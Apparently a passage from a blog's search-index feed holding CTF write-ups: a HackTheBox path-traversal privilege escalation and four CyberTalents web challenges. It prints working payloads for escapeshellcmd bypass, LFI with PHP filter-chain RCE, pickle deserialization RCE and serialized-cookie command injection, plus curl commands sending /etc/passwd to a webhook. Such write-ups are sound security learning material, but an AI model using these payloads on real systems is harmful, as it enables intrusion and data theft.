class="hljs-string">&quot;/home/&quot;</span>)updated_json=$(/usr/bin/jq <span class="hljs-string">&#x27;.directories_to_archive |= map(gsub(&quot;\\.\\./&quot;; &quot;&quot;))&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span>)/usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$updated_json</span>&quot;</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span>directories_to_archive=$(/usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$updated_json</span>&quot;</span> | /usr/bin/jq -r <span class="hljs-string">&#x27;.directories_to_archive[]&#x27;</span>)<span class="hljs-function"><span class="hljs-title">is_allowed_path</span></span>() &#123;    <span class="hljs-built_in">local</span> path=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>    <span class="hljs-keyword">for</span> allowed_path <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;allowed_paths[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span>        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$path</span>&quot;</span> == <span class="hljs-string">&quot;<span class="hljs-variable">$allowed_path</span>&quot;</span>* ]]; <span class="hljs-keyword">then</span>            <span class="hljs-built_in">return</span> 0        <span class="hljs-keyword">fi</span>    <span class="hljs-keyword">done</span>    <span class="hljs-built_in">return</span> 1&#125;<span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$directories_to_archive</span>; <span class="hljs-keyword">do</span>    <span class="hljs-keyword">if</span> ! is_allowed_path <span class="hljs-string">&quot;<span class="hljs-variable">$dir</span>&quot;</span>; <span class="hljs-keyword">then</span>        /usr/bin/echo <span class="hljs-string">&quot;Error: <span class="hljs-variable">$dir</span> is not allowed. Only directories under /var/ and /home/ are allowed.&quot;</span>        <span class="hljs-built_in">exit</span> 1    <span class="hljs-keyword">fi</span><span class="hljs-keyword">done</span>/usr/bin/backy <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span></code></pre></div><p>By reading its code. It’s a bash script that uses a JSON file you provide and then goes to a specific route (mentioned in the JSON file), compresses files that exist at that route, and then puts the compressed file in another specific route (mentioned in the JSON file).</p><p>Noticed, there are allowed paths in place <code>/var/</code>, <code>/home/</code> that you can choose to compress the files. Also in the script, you can see it uses <code>jq</code> to parse the JSON file and filter it from <code>../</code>, preventing path traversal (But that is actually so easy to bypass)</p><div class="code-wrapper"><pre><code class="hljs BASH">allowed_paths=(<span class="hljs-string">&quot;/var/&quot;</span> <span class="hljs-string">&quot;/home/&quot;</span>)updated_json=$(/usr/bin/jq <span class="hljs-string">&#x27;.directories_to_archive |= map(gsub(&quot;\\.\\./&quot;; &quot;&quot;))&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span>)</code></pre></div><p>Fine, but what does that JSON file look like? I have no idea…..likely, i found an example file located in my dir, so i read it and it looks like this:</p><div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;destination&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/martin/backups/&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;multiprocessing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;verbose_log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;directories_to_archive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-string">&quot;/home/app-production/app&quot;</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;exclude&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>We need to change that <code>directories_to_archive</code> parameter value to the <code>/root</code> directory so the script can get its files and compress them. To achieve that, we need path traversal. Since there is a filter for it that filters <code>../</code> we can easily bypass that by doubling the sequence <code>....//</code> so it will remove one and leave one.</p><p>The JSON file created will look like the following:</p><div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;destination&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/martin/backups/&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;multiprocessing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;verbose_log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;directories_to_archive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-string">&quot;/home/....//root/&quot;</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;exclude&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>You can then run the script on your file: <code>sudo /usr/bin/backy.sh testing.json</code>.</p><p><img src="/images/htb-m/code/13.png" alt="Root Flag"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>htb</tag>
      
      <tag>linux</tag>
      
      <tag>machines</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CyberTalents Web challenges</title>
    <link href="/2025/08/01/cybertalents/"/>
    <url>/2025/08/01/cybertalents/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/cybertalents/image.png"></p><p>I’m gonna share some challenges that i solved on CyberTalents</p><h1 id="Escape-202"><a href="#Escape-202" class="headerlink" title="Escape_202"></a>Escape_202</h1><div class="note note-primary">            <p>I made this service to search in the files and directories in the server But my secrets leaked from file at<br><code>/radnomString_flag.txt</code></p>           </div><p>We have a simple search function with source code provided:</p><p><img src="/images/cybertalents/Pasted%20image%2020250721223626.png"></p><p>Looking at the source code, we find the following:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] === <span class="hljs-string">&quot;POST&quot;</span>) &#123;        <span class="hljs-variable">$search</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>]);        <span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;find / -name &quot;</span> .<span class="hljs-variable">$search</span>;        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$command</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Search Results:&lt;/h2&gt;&quot;</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$output</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> . <span class="hljs-variable">$output</span> . <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;No files found matching your search criteria.&lt;/p&gt;&quot;</span>;        &#125;    &#125;    <span class="hljs-meta">?&gt;</span></code></pre></div><p>As we can see, the code takes the <code>search</code> parameter and sanitizes it with <code>escapeshellcmd()</code> function by escaping special characters in a string that could be interpreted as shell commands, preventing unintended command execution.  </p><p>At first glance, we can say it’s a command injection vulnerability. But the only thing stopping us is the <code>escapeshellcmd()</code> function. So it has to be something in it, right? Otherwise, there will be no point making this challenge.  </p><p>By investigating further, looking for ways to bypass this function, I came across this github repo: <a href="https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#find">exploit-bypass-php-escapeshellarg</a></p><p><img src="/images/cybertalents/Pasted%20image%2020250721225024.png"></p><p>I found an exploit that has the same code as i have. All we need is to add our payload:<br><code>sth -or -exec &lt;command&gt; ; -quit</code> and you are good to go.  </p><p>First, we need to know the files exists on the system, the flag is probably on the root domain. By adjusting the payload: <code>sth -or -exec ls / ; -quit</code> and adding it to the search parameter.</p><p><img src="/images/cybertalents/Pasted%20image%2020250721225531.png" alt="Flag File"></p><p>There is another way to do this. you can simply add an asterisk <code>*</code> that will list you all the files exist in the system. The shell will try to interpret the <code>*</code> before the find command in the code runs. This is called globbing or <a href="https://www.geeksforgeeks.org/linux-unix/bash-pathname-expansion-in-linux/">pathname expansion</a>.  </p><p>This will print you the flag file. Now, we need to read it using this payload:<br><code>sth -or -exec cat /sKFmdyk7_flag.txt ; -quit</code>. </p><p><img src="/images/cybertalents/Pasted%20image%2020250721225846.png" alt="Flag"></p><hr><h1 id="Hack-if-u-can"><a href="#Hack-if-u-can" class="headerlink" title="Hack if u can"></a>Hack if u can</h1><div class="note note-primary">            <p>Find the RCE to get access to the system</p>           </div><p>From the description, we need a way to execute commands on the system.<br>It’s a simple shopping site that selling wine</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20132837.png"></p><p>I ran a fuzzer in the background and started exploring the site. The site had some functions, but they all dead, just for decoration. The fuzzer gave me 6 endpoints:</p><ol><li><code>/index.html</code></li><li><code>/about.html</code></li><li><code>/shop.html</code></li><li><code>/contact.html</code></li><li><code>/policy.html</code></li><li><code>/robots.txt</code></li></ol><p>The <code>/robots.txt</code> file had this:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20135101.png"></p><p>Now we know the flag exists in the <code>/etc</code> directory (all those endpoints were dead on the url).</p><p>I start analyzing the endpoints i got from the fuzzer, at the end of each one of them, you will find a link that will redirect you to <code>/policy.html</code>, except the <code>/shop.html</code> will redirect you to <code>/policy.php</code>.</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20133753.png"></p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20133706.png"></p><p>When you visit <code>/policy.php</code>, you will receive a cookie</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20134637.png"></p><p>That is a little weird. I requested that file and got the following:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20135351.png" alt="This message was printed on the root domain too"></p><p>The cookie probably gets us files that exist on the system. So what if we manipulate cookie and try to read files in the system? Leading to LFI.</p><p>I set the cookie in the request, changed it to <code>../../../etc/passwd</code>, and got the following:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20135823.png"></p><p>Cool! Now let’s read the flag we found in the <code>/robots.txt</code> file</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20140032.png"></p><p>Ahhh, we didn’t get RCE yet. I tried to use PHP wrappers to read internal files too. I tried reading <code>policy.php</code> with the filter wrapper: <code>php://filter/read=convert.base64-encode/resource=policy.php</code> and found this code:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;b204217b677944e7c8d2a12c670b5467.txt&quot;</span>);<span class="hljs-variable">$flagFile</span> = <span class="hljs-string">&quot;flag_48cbe4247cc8f7937ff091f257b4e160.txt&quot;</span>;<span class="hljs-comment">// /etc/(flagfile)</span><span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;read&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag_48cbe4247cc8f7937ff091f257b4e160/&#x27;</span>, <span class="hljs-variable">$fileName</span>))&#123;    <span class="hljs-variable">$print</span>=<span class="hljs-number">0</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can&#x27;t read this file, try harder.&quot;</span>;    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>That’s why we can’t read the flag directly with the LFI. One of the first ways i think of to get rce using php wrappers is <strong>php-filters-chain</strong>. I went to this article and used their tool <a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it">php-filters-chain-what-is-it-and-how-to-use-it</a>.</p><p>I start with <code>whoami</code> command chain: <code>python .\php_filter_chain_generator.py --chain &#39;&lt;?php system(&quot;whoami&quot;); ?&gt;&#39;</code>.<br>I got the payload, added it to the cookie, and got the results:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20141056.png"></p><p>Cool! now let’s read the flag: <code>python .\php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /etc/flag_48cbe4247cc8f7937ff091f257b4e160.txt&#39;); ?&gt;&quot;</code></p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20141618.png"></p><p>We got an error; the payload was too big. We can change the command to truncate the payload a little bit:</p><ol><li><code>python .\php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /etc/*&#39;); ?&gt;&quot;</code><br>OR</li><li><code>python .\php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;more /etc/*&#39;); ?&gt;&quot;</code></li></ol><p>And you get the flag<br><img src="/images/cybertalents/Screenshot%202025-08-28%20141821.png"></p><hr><h1 id="Evil-Rick"><a href="#Evil-Rick" class="headerlink" title="Evil Rick"></a>Evil Rick</h1><div class="note note-primary">            <p>We have noticed some weird actions on our website , we think that our passwd file has been compromised , can you make sure that it is secure</p>           </div><p>We need access to <code>/etc/passwd</code> file to get the flag. First, you will see a login page.</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20173715.png"></p><p>I found the creds in the HTML comments.</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20173757.png"></p><p>After a successful login with the remember me option on, you will get two cookies:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20174047.png"></p><p>And the page looks like this:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20174151.png"></p><p>I took the cookie and base64 decoded it and got this:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20175053.png"></p><p>From the page, we see a pickle image, and the token format looks like a pickle object. I used this script from <a href="https://r3billions.com/writeup-pickle-store/">writeup-pickle-store</a> to make sure:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> pickledata = <span class="hljs-string">&quot;gANjX19tYWluX18KdXNyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAHRlc3RxBFgIAAAAcGFzc3dvcmRxBVgEAAAAdGVzdHEGdWIu&quot;</span>decoded_data = base64.b64decode(data)pickle_object = pickle.loads(decoded_data)<span class="hljs-built_in">print</span>(pickle_object)</code></pre></div><p>The script gives me an error: <code>AttributeError: Can&#39;t get attribute &#39;usr&#39; on &lt;module &#39;__main__&#39; </code>. This error happened cause the cookie data describes an object that was an instance of a class named <strong>usr</strong>.<br>The script tries to rebuild the object; it looks for a class definition named <strong>usr</strong> within the script, but because it doesn’t even exist, it throws an error.<br>To fix that we need to create the <strong>usr</strong> class <strong>before</strong> unpickle the data. From the decoded data, we cau assume that there is username, password arguments in the class. So i made this script:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">class</span> <span class="hljs-title class_">usr</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password</span>):        <span class="hljs-variable language_">self</span>.username = username        <span class="hljs-variable language_">self</span>.password = password    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;usr(username=&#x27;<span class="hljs-subst">&#123;self.username&#125;</span>&#x27;, password=&#x27;<span class="hljs-subst">&#123;self.password&#125;</span>&#x27;)&quot;</span>data = <span class="hljs-string">&quot;gANjX19tYWluX18KdXNyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAHRlc3RxBFgIAAAAcGFzc3dvcmRxBVgEAAAAdGVzdHEGdWIu&quot;</span>decoded_data = base64.b64decode(data)pickle_object = pickle.loads(decoded_data)<span class="hljs-built_in">print</span>(pickle_object)</code></pre></div><p>And i got these results: <code>usr(username=&#39;test&#39;, password=&#39;test&#39;)</code>.<br>Cool! Now we know the pickle structure. I went to this writeup <a href="https://r3billions.com/writeup-pickle-store/">writeup-pickle-store</a> and start making the script again:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64COMMAND = <span class="hljs-string">&quot;curl https://webhook.site/04309ada-ed9e-4ac2-9f7c-33771ac78ce5&quot;</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">PickleRce</span>(<span class="hljs-title class_ inherited__">object</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):        <span class="hljs-keyword">import</span> os        <span class="hljs-keyword">return</span> (os.system,(COMMAND,))<span class="hljs-keyword">class</span> <span class="hljs-title class_">usr</span>(<span class="hljs-title class_ inherited__">object</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password</span>):        <span class="hljs-variable language_">self</span>.username = username        <span class="hljs-variable language_">self</span>.password = password<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    user = usr(username=<span class="hljs-string">&quot;test&quot;</span>, password=PickleRce())<span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(user)))</code></pre></div><p>I created a malicious payload that will send a request to my webhook url. By replacing the payload with the intended <code>rememberme</code> cookie, you should receive a request in your webhook:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20183002.png"></p><p>Great! Now we need to read <code>/etc/passwd</code> and send the content to the webhook. There are two ways:</p><ol><li>Change the command to:<br><code>curl &lt;WEBHOOK&gt; --data-binary @/etc/passwd</code><br>OR<br><code>curl &lt;WEBHOOK&gt; -d @/etc/passwd</code></li><li>Change the command to: curl <a href="https://webhook.site/04309ada-ed9e-4ac2-9f7c-33771ac78ce5">https://webhook.site/04309ada-ed9e-4ac2-9f7c-33771ac78ce5</a> `cat &#x2F;etc&#x2F;passwd | base64` (That’s probably gonna fail through parsing errors)</li></ol><p>I used the first method and i got the flag:</p><p><img src="/images/cybertalents/Screenshot%202025-08-28%20190924.png"></p><hr><h1 id="Game-Zone"><a href="#Game-Zone" class="headerlink" title="Game Zone"></a>Game Zone</h1><div class="note note-primary">            <p>We created a gaming platform, but something is not secure, can you confirm that no body can access passwd file.</p>           </div><p>Again, the goal is to read the <code>/etc/passwd</code> file. First thing you will see is a simple page with a login button:</p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20161649.png"></p><p>Once you press the button, you will be redirected to <code>/profile.php</code> page with three cookies:</p><ol><li><code>profile_id=683220190</code> </li><li><code>_user_session=6d21e2a5c97337c6afc59ab627fc433b</code></li><li><code>profile_info=Tzo0OiJVc2VyIjozOntzOjE0OiIAVXNlcgB1c2VybmFtZSI7czoxNjoiTGltYSBDaGFybGllXzAyMCI7czoxMzoiAFVzZXIAaXNBZG1pbiI7YjowO3M6NjoiYWN0aXZlIjtzOjExOiIxNzU2NDczNDg1CiI7fQ%3D%3D</code></li></ol><p>The most important is <code>profile_info</code> one, it looks like url then base64 encoded. I took the token and decoded it and found the following:</p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20162117.png"></p><p>This looks like a serialization format. We have a user class that has three arguments:</p><ol><li>username</li><li>isAdmin</li><li>active</li></ol><p>The server takes the cookie, deserializes it, and gets the data to get the intended user like that:</p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20162621.png"></p><p>The first thing that comes to my mind is a deserialization attack, since i didn’t find anything useful on the site. I start playing with the serialized cookie to make a malicious one. I made this PHP code to help me with that:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>; <span class="hljs-keyword">private</span> <span class="hljs-variable">$isAdmin</span>; <span class="hljs-keyword">public</span> <span class="hljs-variable">$active</span>;&#125;<span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionObject</span>(<span class="hljs-variable">$u</span>);<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;1756471575&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$u</span>)).PHP_EOL;<span class="hljs-meta">?&gt;</span></code></pre></div><p>I changed the username and set the <code>isAdmin</code> argument to 1, we may get admin privileges from that.<br>I used the result cookie from the script and found this:</p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20163319.png"></p><p>Cool! The attack works fine. The image changed to another one, indicating that we are admin now because of the image name, it was <code>guest.jpg</code> before:</p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20163505.png"></p><p>The admin account doesn’t really give anything useful. We still need to manipulate the cookie more, getting command injection to read the <code>/etc/passwd</code> file. </p><p>I start thinking about gadget chains and magic methods, but the thing is, it’s almost impossible to leverage these attacks without the source code.  </p><p>So i fuzzed on almost everything (endpoints, parameters, headers) and i found something weird. When you add a slash <code>/</code> after the <code>profile.php</code> endpoint like this <code>/profile.php/</code>. The page gets wider, and i saw two new headers in the request</p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20172045.png"></p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20172123.png"></p><p>While searching on those headers on MDN, i found they are related to fetching resources, faster rendering that is used to optimize browser performance, nothing much. </p><p>I couldn’t find the source code to find a new class that may use a magic method that will help in the exploit, so it has to be in that <strong>User</strong> class. I start looking on the class arguments again and i got interested with the <strong>active</strong> argument.</p><p>This argument uses a <a href="https://www.unixtimestamp.com/">Unix Timestamp</a>, the server is taking a value that the user provides and <strong>processing</strong> it into a human-readable date string, we may get a command injection here. I changed the code and start adding a delimiter <code>;</code> in the <strong>active</strong> argument’s value and inject a <code>whoami</code> command after it:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>; <span class="hljs-keyword">private</span> <span class="hljs-variable">$isAdmin</span>; <span class="hljs-keyword">public</span> <span class="hljs-variable">$active</span>;&#125;<span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;whoami&#x27;</span>;<span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionObject</span>(<span class="hljs-variable">$u</span>);<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;attacker&#x27;</span>);<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;1756471575; &#x27;</span>  . <span class="hljs-variable">$command</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$u</span>)).PHP_EOL;<span class="hljs-meta">?&gt;</span></code></pre></div><p>I got the new cookie from the script, added it to the request, and sent it: </p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20180618.png"></p><p>The attack works! Now, by changing the command to <code>cat /etc/passwd</code>, you will successfully get the flag:</p><p><img src="/images/cybertalents/Screenshot%202025-08-29%20181238.png" alt="Flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
